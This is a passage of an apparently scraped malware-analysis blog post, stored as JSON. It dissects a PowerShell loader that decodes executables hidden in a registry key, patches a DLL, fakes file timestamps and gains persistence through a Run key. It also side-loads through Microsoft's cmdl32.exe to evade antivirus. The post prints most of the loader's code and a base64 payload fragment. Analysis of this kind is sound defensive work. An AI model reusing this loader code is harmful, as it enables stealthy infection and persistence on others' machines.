QgLXQgJGRteWJpblBhdGggLWIgJGNtZGwzMnBhdGgNCg0KCSRhdnIgPSBHZXQtUHJvY2VzcyAkcG5hbWVhdnIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCglpZiAoISRhdnIpIHsNCgkJJigkZG15YmluUGF0aCkgfCBPdXQtTnVsbDsNCgl9DQoJRXhpdA0KfQ0KY2F0Y2ggew0KCSRfLkV4Y2VwdGlvbi5NZXNzYWdlIHwgT3V0LU51bGw7DQp9\"””)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_30":{"__typename":"Paragraph","id":"9376201130db_30","name":"3d63","type":"P","href":null,"layout":null,"metadata":null,"text":"There is a new base64 block decoded:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_31":{"__typename":"Paragraph","id":"9376201130db_31","name":"7386","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force;\n$ErrorActionPreference=’SilentlyContinue’;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_32":{"__typename":"Paragraph","id":"9376201130db_32","name":"818a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$pname36 = “3” + “60Tr” + “ay”\n$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;\n$bin = “Winset.exe”;\ntry{\n$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}\ncatch{\n$cmdLine = $bin;\n}\n$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n[array]::copy($cbytes,$line,$cbytes.length);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_33":{"__typename":"Paragraph","id":"9376201130db_33","name":"58ba","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$binPath = $binDir + $bin;\n$binPathdll = $binDir + “cmpbk32.dll”;\n$dmybinPath = $binDir + “cmdl32.exe”;\n$rpcdllpath = $binDir + “57146C96.dll”;\n$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;\n$system = ‘HKCU:Software\\Updater’;\n$runExists = False;\n$pnameavr = “av” + “gn” + “t”;\n$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_34":{"__typename":"Paragraph","id":"9376201130db_34","name":"2203","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\n exit\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_35":{"__typename":"Paragraph","id":"9376201130db_35","name":"4b28","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function dc($s){\n sal n New-Object;\n $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n $ms = n System.IO.MemoryStream;\n $ms.Write($data, 0, $data.Length);\n $ms.Seek(0,0) | Out-Null;\n return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_36":{"__typename":"Paragraph","id":"9376201130db_36","name":"f854","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function updt($t, $b){\n (ls $t).LastWriteTime = (ls $b).LastWriteTime\n (ls $t).CreationTime = (ls $b).CreationTime\n (ls $t).LastAccessTime = (ls $b).LastAccessTime\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_37":{"__typename":"Paragraph","id":"9376201130db_37","name":"2c33","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function wb64($path, $b64){\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($path,$bytes) | Out-Null;\n updt -t $path -b $cmdl32path\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_38":{"__typename":"Paragraph","id":"9376201130db_38","name":"0563","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function sb($h, $n ) {\n $len = $n.length;\n $limit = $h.length — $len;\n For( $i = 0; $i -le $limit; $i++ ) {\n $k = 0;\n For( ; $k -lt $len; $k++ ) {\n if( $n[$k] -ne $h[$i+$k] ) {break};\n }\n if( $k -eq $len ){return $i};\n }\n return -1;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_39":{"__typename":"Paragraph","id":"9376201130db_39","name":"14bf","type":"BQ","href":null,"layout":null,"metadata":null,"text":"if((Test-Path $env:WINDIR\\SysWOW64)){\n $msvbvmdllpath = $env:WINDIR + “\\SysWOW64\\msvbvm60.dll”\n $cmdl32path = $env:WINDIR + “\\SysWOW64\\cmdl32.exe”\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_40":{"__typename":"Paragraph","id":"9376201130db_40","name":"d993","type":"BQ","href":null,"layout":null,"metadata":null,"text":"try{\n if(!(Test-Path $binPath)){","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_41":{"__typename":"Paragraph","id":"9376201130db_41","name":"b496","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64 = dc -s ((Get-ItemProperty -Path $system).part1);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n [array]::copy($rn,0,$bytes,$bytes.length — 2,2);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;\n updt -t $binPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_42":{"__typename":"Paragraph","id":"9376201130db_42","name":"9d6a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\n updt -t $binPathdll -b $cmdl32path\n }","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_43":{"__typename":"Paragraph","id":"9376201130db_43","name":"ca4f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Remove-Item -Path $system | Out-Null;\n Remove-Item $PROFILE.CurrentUserAllHosts | Out-Null;\n New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;\n \n Copy-Item $msvbvmdllpath $rpcdllpath\n updt -t $rpcdllpath -b $msvbvmdllpath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_44":{"__typename":"Paragraph","id":"9376201130db_44","name":"28b4","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Copy-Item $cmdl32path $dmybinPath\n updt -t $dmybinPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_45":{"__typename":"Paragraph","id":"9376201130db_45","name":"737b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue\n if (!$avr) {\n &($dmybinPath) | Out-Null;\n }\n Exit\n}\ncatch {\n $_.Exception.Message | Out-Null;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_46":{"__typename":"Paragraph","id":"9376201130db_46","name":"dd52","type":"P","href":null,"layout":null,"metadata":null,"text":"This powershell checks if the AV 360 is installed:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_47":{"__typename":"Paragraph","id":"9376201130db_47","name":"cc6b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$pname36 = “3” + “60Tr” + “ay”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_48":{"__typename":"Paragraph","id":"9376201130db_48","name":"fd7e","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\n exit\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_49":{"__typename":"Paragraph","id":"9376201130db_49","name":"6f46","type":"P","href":null,"layout":null,"metadata":null,"text":"We can imagine the attackers were made a recon step before.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_50":{"__typename":"Paragraph","id":"9376201130db_50","name":"cfbc","type":"P","href":null,"layout":null,"metadata":null,"text":"The folder where the loadin chain is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_51":{"__typename":"Paragraph","id":"9376201130db_51","name":"12ee","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_52":{"__typename":"Paragraph","id":"9376201130db_52","name":"dd1f","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell copies:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_53":{"__typename":"Paragraph","id":"9376201130db_53","name":"7853","type":"P","href":null,"layout":null,"metadata":null,"text":"$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_54":{"__typename":"Paragraph","id":"9376201130db_54","name":"805a","type":"P","href":null,"layout":null,"metadata":null,"text":"Copy-Item $cmdl32path $dmybinPath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_55":{"__typename":"Paragraph","id":"9376201130db_55","name":"b722","type":"P","href":null,"layout":null,"metadata":null,"text":"Copy-Item $msvbvmdllpath $rpcdllpath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_56":{"__typename":"Paragraph","id":"9376201130db_56","name":"ba77","type":"P","href":null,"layout":null,"metadata":null,"text":"So msvbvm60.dll becomes: 57146C96.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_57":{"__typename":"Paragraph","id":"9376201130db_57","name":"64ed","type":"P","href":null,"layout":null,"metadata":null,"text":"And Winset.exe and cmpbk32.dll are decoded and copied in the same folder.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_58":{"__typename":"Paragraph","id":"9376201130db_58","name":"4983","type":"P","href":null,"layout":null,"metadata":null,"text":"part1 and part2 is the reg key base here $system = ‘HKCU:Software\\Updater’;:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_59":{"__typename":"Paragraph","id":"9376201130db_59","name":"1042","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HKCU\\Software\\Updater”, “”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_60":{"__typename":"Paragraph","id":"9376201130db_60","name":"a53d","type":"P","href":null,"layout":null,"metadata":null,"text":"part1 is big blob of base64 data.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_61":{"__typename":"Paragraph","id":"9376201130db_61","name":"6308","type":"P","href":null,"layout":null,"metadata":null,"text":"Firstly the registry key is retrieve:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_62":{"__typename":"Paragraph","id":"9376201130db_62","name":"6384","type":"P","href":null,"layout":null,"metadata":null,"text":"(Get-ItemProperty -Path $system).part1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_63":{"__typename":"Paragraph","id":"9376201130db_63","name":"1a64","type":"P","href":null,"layout":null,"metadata":null,"text":"after is the function dc is called.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_64":{"__typename":"Paragraph","id":"9376201130db_64","name":"992c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function dc($s){\n sal n New-Object;\n $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n $ms = n System.IO.MemoryStream;\n $ms.Write($data, 0, $data.Length);\n $ms.Seek(0,0) | Out-Null;\n return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_65":{"__typename":"Paragraph","id":"9376201130db_65","name":"35c5","type":"P","href":null,"layout":null,"metadata":null,"text":"this string “H4sIAAAAAAA” is added at part2 and the data is decoded an","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_66":{"__typename":"Paragraph","id":"9376201130db_66","name":"2852","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_67":{"__typename":"Paragraph","id":"9376201130db_67","name":"ca52","type":"P","href":null,"layout":null,"metadata":null,"text":"and unzip:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_68":{"__typename":"Paragraph","id":"9376201130db_68","name":"5f3b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_69":{"__typename":"Paragraph","id":"9376201130db_69","name":"ae1f","type":"P","href":null,"layout":null,"metadata":null,"text":"and the Mz header in base64 is added and decoded:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_70":{"__typename":"Paragraph","id":"9376201130db_70","name":"10e5","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_71":{"__typename":"Paragraph","id":"9376201130db_71","name":"762a","type":"P","href":null,"layout":null,"metadata":null,"text":"and the executable is modified for the last time and copied in $binDir:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_72":{"__typename":"Paragraph","id":"9376201130db_72","name":"442c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n [array]::copy($rn,0,$bytes,$bytes.length — 2,2);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_73":{"__typename":"Paragraph","id":"9376201130db_73","name":"7639","type":"P","href":null,"layout":null,"metadata":null,"text":"The dll is decoded, modified and written on disk in the same way:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_74":{"__typename":"Paragraph","id":"9376201130db_74","name":"da3f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\n updt -t $binPathdll -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_75":{"__typename":"Paragraph","id":"9376201130db_75","name":"bcfb","type":"P","href":null,"layout":null,"metadata":null,"text":"The Trick very important here is : [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); to modify the dll.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":35,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_76":{"__typename":"Paragraph","id":"9376201130db_76","name":"8d37","type":"P","href":null,"layout":null,"metadata":null,"text":"If you decode the before the modification you have a dll truncated.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_77":{"__typename":"Paragraph","id":"9376201130db_77","name":"5f20","type":"P","href":null,"layout":null,"metadata":null,"text":"before:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*mwhQ9Jt9xLiVaH_mVv6uaw.png":{"__typename":"ImageMetadata","id":"1*mwhQ9Jt9xLiVaH_mVv6uaw.png","originalHeight":523,"originalWidth":989,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_78":{"__typename":"Paragraph","id":"9376201130db_78","name":"2d55","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*mwhQ9Jt9xLiVaH_mVv6uaw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_79":{"__typename":"Paragraph","id":"9376201130db_79","name":"c640","type":"P","href":null,"layout":null,"metadata":null,"text":"after:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*gskxEMV2wHIwHkcKEQu-NQ.png":{"__typename":"ImageMetadata","id":"1*gskxEMV2wHIwHkcKEQu-NQ.png","originalHeight":539,"originalWidth":969,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_80":{"__typename":"Paragraph","id":"9376201130db_80","name":"31f7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*gskxEMV2wHIwHkcKEQu-NQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_81":{"__typename":"Paragraph","id":"9376201130db_81","name":"48ef","type":"P","href":null,"layout":null,"metadata":null,"text":"In fact:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_82":{"__typename":"Paragraph","id":"9376201130db_82","name":"a0e4","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell modify the dll to add $lines","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_83":{"__typename":"Paragraph","id":"9376201130db_83","name":"32ff","type":"P","href":null,"layout":null,"metadata":null,"text":"and $lines","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_84":{"__typename":"Paragraph","id":"9376201130db_84","name":"45f6","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n[array]::copy($cbytes,$line,$cbytes.length);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_85":{"__typename":"Paragraph","id":"9376201130db_85","name":"8e83","type":"P","href":null,"layout":null,"metadata":null,"text":"and $cmdLine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_86":{"__typename":"Paragraph","id":"9376201130db_86","name":"642b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bin =Winset.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_87":{"__typename":"Paragraph","id":"9376201130db_87","name":"175a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_88":{"__typename":"Paragraph","id":"9376201130db_88","name":"28ce","type":"P","href":null,"layout":null,"metadata":null,"text":"like in the dll: .string “Winset.exe -0000000100001223","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_89":{"__typename":"Paragraph","id":"9376201130db_89","name":"924e","type":"P","href":null,"layout":null,"metadata":null,"text":"So we have in the same folder: Winset\\Config","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_90":{"__typename":"Paragraph","id":"9376201130db_90","name":"ccf4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Winset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_91":{"__typename":"Paragraph","id":"9376201130db_91","name":"170f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cmpbk32.dll (part2 modified and decoded)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_92":{"__typename":"Paragraph","id":"9376201130db_92","name":"9727","type":"ULI","href":null,"layout":null,"metadata":null,"text":"57146C96.dll (vb virtual machine)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_93":{"__typename":"Paragraph","id":"9376201130db_93","name":"423f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cmdl32.exe (executable of windows)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_94":{"__typename":"Paragraph","id":"9376201130db_94","name":"e1ff","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell change timestamps of files copied:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_95":{"__typename":"Paragraph","id":"9376201130db_95","name":"a795","type":"BQ","href":null,"layout":null,"metadata":null,"text":"updt -t $binPathdll -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_96":{"__typename":"Paragraph","id":"9376201130db_96","name":"84da","type":"BQ","href":null,"layout":null,"metadata":null,"text":"updt -t $binPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_97":{"__typename":"Paragraph","id":"9376201130db_97","name":"1537","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function updt($t, $b){\n (ls $t).LastWriteTime = (ls $b).LastWriteTime\n (ls $t).CreationTime = (ls $b).CreationTime\n (ls $t).LastAccessTime = (ls $b).LastAccessTime\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_98":{"__typename":"Paragraph","id":"9376201130db_98","name":"4f4a","type":"H3","href":null,"layout":null,"metadata":null,"text":"Persistance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_99":{"__typename":"Paragraph","id":"9376201130db_99","name":"2a4d","type":"P","href":null,"layout":null,"metadata":null,"text":"The persistant is a hkey run very basic with the path of the dll in parameter:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_100":{"__typename":"Paragraph","id":"9376201130db_100","name":"2963","type":"P","href":null,"layout":null,"metadata":null,"text":"$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_101":{"__typename":"Paragraph","id":"9376201130db_101","name":"9dd6","type":"P","href":null,"layout":null,"metadata":null,"text":"New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_102":{"__typename":"Paragraph","id":"9376201130db_102","name":"09a4","type":"P","href":null,"layout":null,"metadata":null,"text":"To reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_103":{"__typename":"Paragraph","id":"9376201130db_103","name":"d509","type":"H3","href":null,"layout":null,"metadata":null,"text":"Loading Chain","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_104":{"__typename":"Paragraph","id":"9376201130db_104","name":"ce69","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_105":{"__typename":"Paragraph","id":"9376201130db_105","name":"8812","type":"P","href":null,"layout":null,"metadata":null,"text":"this exe used: 